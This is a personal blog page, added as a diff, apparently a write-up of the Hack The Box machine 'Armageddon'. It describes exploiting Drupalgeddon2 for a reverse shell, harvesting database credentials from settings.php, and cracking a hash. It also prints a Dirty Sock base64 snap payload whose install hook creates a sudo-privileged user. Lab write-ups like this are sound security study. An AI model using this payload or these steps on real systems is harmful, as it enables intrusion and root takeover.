@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en"> 
+<head>
+
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-5YK5MXEZF1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-5YK5MXEZF1');
+</script>
+
+
+    <title>Write-ups</title>
+    
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       
+    <link rel="shortcut icon" href="favicon.ico"> 
+    
+    <!-- FontAwesome JS-->
+    <script defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+    
+    <!-- Theme CSS -->  
+    <link id="theme-style" rel="stylesheet" href="assets/css/theme-1.css">
+    
+
+</head> 
+
+<body>
+    
+    <header class="header text-center">	    
+	    <h1 class="blog-name pt-lg-1 mb-0"><a href="index.html">Adventures with Bits  </a></h1>
+        
+	    <nav class="navbar navbar-expand-lg navbar-dark" >
+           
+			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
+			<span class="navbar-toggler-icon"></span>
+			</button>
+
+			<div id="navigation" class="collapse navbar-collapse flex-column" >
+				<div class="profile-section pt-3 pt-lg-0">
+				    <img class="profile-image mb-3 rounded mx-auto" src="assets/images/profile.png" alt="image" >			
+					
+					<div class="bio mb-3">"Technical Problems Can Have Artistic Solutions"<br>
+                                 - Jon Erickson The Art of Exploitation </div><!--//bio-->
+					<ul class="social-list list-inline py-3 mx-auto">
+
+			            <li class="list-inline-item"><a href="https://twitter.com/UnknownHimash"><i class="fab fa-twitter fa-fw"></i></a></li>
+			           
+			            <li class="list-inline-item"><a href="https://github.com/himash"><i class="fab fa-github-alt fa-fw"></i></a></li>
+			            
+			        </ul><!--//social-list-->
+			        
+				</div><!--//profile-section-->
+				
+				<ul class="navbar-nav flex-column text-left">
+					<li class="nav-item">
+					    <a class="nav-link" href="index.html"><i class="fas fa-home fa-fw mr-2"></i>Blog Home <span class="sr-only">(current)</span></a>
+					</li>
+					<li class="nav-item">
+					    <a class="nav-link" href="publications.html"><i class="fas fa-bookmark fa-fw mr-2"></i>Publications</a>
+					</li>
+
+						<li class="nav-item">
+					    <a class="nav-link" href="projects.html"><i class="fas fa-bookmark fa-fw mr-2"></i>Projects</a>
+					</li>
+					<li class="nav-item active">
+					    <a class="nav-link" href="write-up.html"><i class="fas fa-user fa-fw mr-2"></i>Write-ups</a>
+					</li>
+
+					<li class="nav-item">
+					    <a class="nav-link" href="tools.html"><i class="fas fa-user fa-fw mr-2"></i>Tools</a>
+					</li>
+
+					<li class="nav-item active">
+					    <a class="nav-link" href="ack.html"><i class="fas fa-user fa-fw mr-2"></i>Acknowledgements</a>
+					</li>
+
+				</ul>
+				
+				
+			</div>
+		</nav>
+    </header>
+
+
+    <!-----------------------------------Header and stuff Ends Here-------------------------------------------------->
+
+
+
+
+<!-------------------------------------Article Starts Here --------------------------------------------------------------->
+
+
+    <div class="main-wrapper">
+	    
+	    <article class="blog-post px-3 py-5 p-md-5">
+		    <div class="container">
+			    <header class="blog-post-header">
+				    <h2 class="title mb-2">Armageddon - HTB</h2>
+				    
+
+			    </header>
+			    
+			    <div class="blog-post-body">
+
+			    	<!-----PICTURE
+				    <figure class="blog-banner">
+				        <a href="https://made4dev.com"><img class="img-fluid" src="assets/images/blog/blog-post-banner.jpg" alt="image"></a>
+
+				        
+				        <figcaption class="mt-2 text-center image-caption">Image Credit: <a href="https://made4dev.com?ref=devblog" target="_blank">made4dev.com (Premium Programming T-shirts)</a></figcaption>
+				    </figure>
+				    -------------------------------------------------------->
+
+				    <p>
+
+				    	<br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-intro.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				      Armageddon is rated as easy machine, however this machine can give you interesting attack vectors to try.<br>
+				      Let's begin with initial scan to find initial foothold attack vector for this machine. 
+
+				      <br><br>
+
+				       <h4 class="title mb-2">Initial Foothold & User</h4>
+
+				       <br>
+
+				     
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-nmap1.png" alt="image"></a>
+
+				      </figure>
+
+
+				      <br> 
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-web.png" alt="image"></a>
+
+				      </figure>
+
+
+				      <br> 
+
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-web1.png" alt="image"></a>
+
+				      </figure>
+
+
+				      <br> 
+
+				      Based on the nmap scan result it was found that port 22 (SSH) and port 80 (HTTP) are opened.<br>
+				      The result shows that Drupal 7 CMS has been used, Drupal is a free and open-source web content management framework (CMF) written in PHP. Drupalgeddon-2 is a very popular exploit for the Drupal, Drupalgeddon 2 (SA-CORE-2018-002 / CVE-2018-7600), was disclosed by the Drupal security team. This vulnerability allow an unauthenticated attacker to perform remote code execution on default or common Drupal installations. Drupalgeddon vulnerability analysis articles can be found on internet with in-depth technical details.<br><br>
+				      <a href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/"> https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/</a>
+
+				      <br><br>
+
+				      Drupalgeddon-2 is a vulnerability that can be exploited due to the lack of data sanitization, Drupal has form API, a powerful tool allowing developers to create forms and handle form submissions quickly and easily. To achieve this, the API uses a hierarchical associative array (Render Array) containing the data that will be rendered, as well as some properties which establish how the data should be rendered. injecting an array to the form array structure will end up in remote code execution. above mentioned article from checkpoint illustrates the vulnerability in detail.
+				      I just used this github <a href='https://github.com/dreadlocked/Drupalgeddon2'> https://github.com/dreadlocked/Drupalgeddon2 </a> exploit code against the target. 
+
+
+
+				      <br><br>
+
+				    	
+
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-shell.png" alt="image"></a>
+
+				      </figure>
+
+
+				      <br> 
+
+
+
+				      After running the exploit i just successfully obtained the reverse shell from the machine. the shell which i was obtained is for the user 'apache', to get user i explored the drupal files to see if there is any credentials are exposed through any configuration files. during the exploration i found /var/www/html/sites/default/settings.php file with database credentials.  
+
+
+				      <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-db-creds.png" alt="image"></a>
+
+				      </figure>
+
+
+				      <br>
+ 
+
+              By using the database credentials it is possible to get user hash.
+
+
+                  <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-db1.png" alt="image"></a>
+
+				      </figure>
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-db2.png" alt="image"></a>
+
+				      </figure>
+
+				      
+
+				      By running the hashcat i can get the user password.
+
+				      <br><br>
+
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-pass.png" alt="image"></a>
+
+				      </figure>
+
+
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-pass2.png" alt="image"></a>
+
+				      </figure><br>
+				      By using the cracked password i can login as user 'brucetherealadmin', and i can get the user.txt !
+
+				      <br><br>
+
+
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-user.png" alt="image"></a>
+
+				      </figure>
+
+				     
+
+				       <h4 class="title mb-2">Privilege Escalation</h4>
+                
+                sudo -l reveals that snap can be run with sudo from a non-root user
+
+		           <br>
+		           <br>
+
+		           <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-sudo-priv.png" alt="image"></a>
+
+				      </figure>
+
+				      Snap is containerised software packages which are easy to install. one of the popular exploit related to the snap privilege escalation is 'Dirty-Sock' .<br><br>
+
+				      <a href='https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html' > https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html </a>
+				      <br>
+				      <a href='https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html#'> https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html# </a> 
+				      <br><br>
+
+				      The snap version 2.47.1 is presented in the machine, 2.37.1 or greater is patched however there are cases where Snap may not have all the components installed that are required to sideload a malicious snap package. In that case, it will try to upgrade, and if it can, the exploit will still work. <br>
+				      The following global is a base64 encoded string representing an installable
+              snap package. The snap itself is empty and has no functionality. It does,
+              however, have a bash-script in the install hook that will create a new user 'dirty_sock'.
+
+              <pre>
+              <code>
+
+python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD<br>
+//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbS<br>
+AtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25<br>
+KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29ja<br>
+wplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJ<br>
+zaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ<br>
+2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZ<br>
+tb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/<br>e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/<br>VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan<br>
+87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvG<br>
+fMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAA<br>
+AAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > me.snap
+
+            </code>
+          </pre>
+
+          After creating the snap package i installed with the following command,"sudo /usr/bin/snap install --devmode me.snap"<br>
+          Now i can switch the user to dirty_sock with password 'dirty_sock'. hereafter i can get root by running 'sudo su'. sometimes you have to reset the machine if exploit doesn't work, this is because of other players who already exploited the snap. 
+          <br><br>
+
+
+		           <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-root1.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+
+		           <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/armageddon/ar-root2.png" alt="image"></a>
+
+				      </figure>
+
+
+
+
+ 
+
+
+
+	
+
+<!--------------------------------------------Article End ------------------------------------------------------>
+
+
+
+				    <!--------------------------------------------------------------------------------------------- Coding section
+				    <h3 class="mt-5 mb-3">Code Block Example</h3>
+				    <p>You can get more info at <a href="https://highlightjs.org/" target="_blank">https://highlightjs.org/</a>. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. </p>
+				    <pre>
+					    <code>
+function $initHighlight(block, cls) {
+  try {
+    if (cls.search(/\bno\-highlight\b/) != -1)
+      return process(block, true, 0x0F) +
+             ` class="${cls}"`;
+  } catch (e) {
+    /* handle exception */
+  }
+  for (var i = 0 / 2; i < classes.length; i++) {
+    if (checkCondition(classes[i]) === undefined)
+      console.log('undefined');
+  }
+}
+
+export  $initHighlight;
+					    </code>
+				    </pre>
+
+				  Ending here --------------------------------------------------------------------------------------------> 
+
+					
+
+					
+				   
+			    </div>
+				    
+
+				  <!--------------------------------------------------------------------------------- Navigation section  
+			    <nav class="blog-nav nav nav-justified my-5">
+				  <a class="nav-link-prev nav-item nav-link rounded-left" href="index.html">Previous<i class="arrow-prev fas fa-long-arrow-alt-left"></i></a>
+				  <a class="nav-link-next nav-item nav-link rounded-right" href="blog-list.html">Next<i class="arrow-next fas fa-long-arrow-alt-right"></i></a>
+				</nav>
+				-----------------------------------------------------------------------------------------------------------> 
+
+	    </article>
+	    
+
+    
+    </div><!--//main-wrapper-->
+    
+
+
+
+    
+       
+    <!-- Javascript -->          
+    <script src="assets/plugins/jquery-3.3.1.min.js"></script>
+    <script src="assets/plugins/popper.min.js"></script> 
+    <script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script> 
+    
+    <!-- Page Specific JS -->
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.14.2/highlight.min.js"></script>
+
+    <!-- Custom JS -->
+    <script src="assets/js/blog.js"></script>
+      
+    
+
+</body>
+</html> 
